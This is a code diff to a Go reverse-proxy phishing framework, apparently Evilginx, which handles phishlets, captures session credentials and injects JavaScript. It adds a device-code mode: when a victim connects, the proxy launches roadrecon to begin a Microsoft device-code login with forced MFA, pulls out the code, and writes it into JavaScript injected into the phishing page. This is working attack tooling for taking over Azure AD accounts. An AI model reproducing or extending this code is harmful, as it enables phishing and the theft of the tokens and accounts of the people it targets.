@@ -24,6 +24,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"regexp"
 	"sort"
@@ -52,7 +53,6 @@ const (
 	CONVERT_TO_PHISHING_URLS = 1
 )
 
-
 const (
 	httpReadTimeout  = 45 * time.Second
 	httpWriteTimeout = 45 * time.Second
@@ -61,6 +61,8 @@ const (
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
 var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+
+var devicecode string
 
 type HttpProxy struct {
 	Server            *http.Server
@@ -77,6 +79,7 @@ type HttpProxy struct {
 	cookieName        string
 	last_sid          int
 	developer         bool
+	devicecode_mode   bool
 	ip_whitelist      map[string]int64
 	ip_sids           map[string]string
 	auto_filter_mimes []string
@@ -106,7 +109,61 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func replacePlaceholder(script string, replaceValue string) string {
+
+	log.Info("Replacing with %s", replaceValue)
+	val := replaceValue
+	re := regexp.MustCompile(`input\.value\s*=\s*["'][^"']*["']`)
+	script = re.ReplaceAllString(script, fmt.Sprintf(`input.value = "%s"`, val))
+	return script
+}
+
+func roadreconAuthDeviceCode(remote_addr string) string {
+	if devicecode != "" {
+		// Already run once, just return it
+		return devicecode
+	}
+
+	venvDir := "venv"
+	python := "venv/bin/python"
+
+	cmd := exec.Command(python, "-u", venvDir+"/bin/roadrecon", "auth", "-c", "msbroker", "-r", "devicereg", "--device-code", "--force-mfa", "-f", ".roadtools_auth-"+remote_addr)
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		log.Fatal("StdoutPipe: %v", err)
+	}
+
+	fmt.Println("Starting process")
+	if err := cmd.Start(); err != nil {
+		log.Fatal("Start: %v", err)
+	}
+
+	// Read only the first line (blocks this goroutine until it's available)
+	scanner := bufio.NewScanner(stdout)
+	var firstLine string
+	if scanner.Scan() {
+		firstLine = strings.TrimSpace(scanner.Text())
+		code := strings.TrimSpace(string(firstLine))
+		fields := strings.Fields(code)
+		devicecode = fields[len(fields)-3]
+	}
+
+	// Let the process continue running; reap it later in background
+	go func() {
+		if err := cmd.Wait(); err != nil {
+			log.Printf("python exited with error: %v", err)
+		} else {
+			log.Printf("python exited normally")
+		}
+	}()
+
+	// Now you have firstLine and the rest of your Go program continues
+	log.Important("devicecode: %s", devicecode)
+	return devicecode
+
+}
+
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, devicecode_mode bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -118,6 +175,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
+		devicecode_mode:   devicecode_mode,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
@@ -168,6 +226,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+
+			if p.devicecode_mode {
+				roadreconAuthDeviceCode(from_ip)
+			}
 
 			// handle proxy headers
 			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
@@ -230,6 +292,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							js_params = &s.Params
 
 							script, err := pl.GetScriptInjectById(js_id, js_params)
+
+							if p.devicecode_mode {
+								script = replacePlaceholder(script, devicecode)
+							}
+
 							if err == nil {
 								d_body += script + "\n\n"
 							} else {
@@ -466,7 +533,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -656,7 +722,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					
+
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1171,7 +1237,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if err == nil {
 								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
 							}
-
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
 						}
@@ -1346,7 +1411,7 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
 		return body
-	} 
+	}
 	ret := []byte(re.ReplaceAllString(string(body), d_inject))
 	return ret
 }
@@ -1797,8 +1862,6 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 
 	return "", false
 }
-
-
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
